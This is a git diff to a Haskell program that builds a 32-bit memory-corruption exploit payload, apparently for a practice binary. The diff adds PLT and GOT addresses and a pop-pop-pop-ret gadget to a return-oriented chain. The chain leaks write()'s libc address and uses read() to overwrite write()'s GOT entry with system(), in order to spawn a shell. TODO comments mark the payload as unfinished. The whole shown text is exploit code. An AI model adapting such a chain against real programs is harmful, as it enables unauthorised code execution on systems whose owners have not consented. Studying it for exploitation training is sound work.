@@ -61,15 +61,18 @@ toAddr = byteSwap32
 nops :: ByteString
 nops = B.replicate 140 nop
 
-readAddress :: Word32
+readAddrPLT :: Word32
+readAddrPLT = toAddr 0x804832c
+
+readAddrGOT :: Word32
 -- this is the plt address
 -- readAddress = toAddr 0x804832c
 -- this is the got address
-readAddress = toAddr 0x804961c
+readAddrGOT = toAddr 0x804961c
 
 -- this is the plt address
-writeAddressPLT :: Word32
-writeAddressPLT = toAddr 0x804830c
+writeAddrPLT :: Word32
+writeAddrPLT = toAddr 0x804830c
 
 -- this is the got address
 writeAddressGOT :: Word32
@@ -78,17 +81,33 @@ writeAddressGOT = toAddr 0x8049614
 exploit :: ByteString
 exploit = "abcd"
 
+popPopPopRetAddr :: Word32
+popPopPopRetAddr = toAddr 0x080484b6
+
 -- TODO: This successfully prints out the address of the of write() in
--- libc.  Next I need to figure out the offset of system(), read() in
--- that value and overwrite write() in the GOT, then call it one more
--- time to spawn a shell.
+-- libc, and tries to read in an address of system() to write() to
+-- write()'s GOT entry.
+--
+-- Next, in Haskell I need to read() in the value of write()'s GOT, use it
+-- to figure out the offset of system(), so that the call to read() can
+-- write it to write()'s GOT.  Then I need to call write() one more time so
+-- that it actually calls system().  Also need to figure out what arguments
+-- to pass to system().
 paddedExploit :: ByteString
 paddedExploit = nops
-    <> encode writeAddressPLT
-        <> B.replicate 4 nop
+    <> encode writeAddrPLT
+        <> encode popPopPopRetAddr
         <> encode (toAddr 1)
         <> encode writeAddressGOT
         <> encode (toAddr 4)
+    <> encode readAddrPLT
+        <> encode popPopPopRetAddr
+        <> encode (toAddr 0)
+        <> encode writeAddressGOT
+        <> encode (toAddr 4)
+    <> encode writeAddrPLT -- this should be pointing to system()
+        <> B.replicate 4 nop
+        <> encode (toAddr 0) -- TODO: what should these args be?
 
 main :: IO ()
 main = do
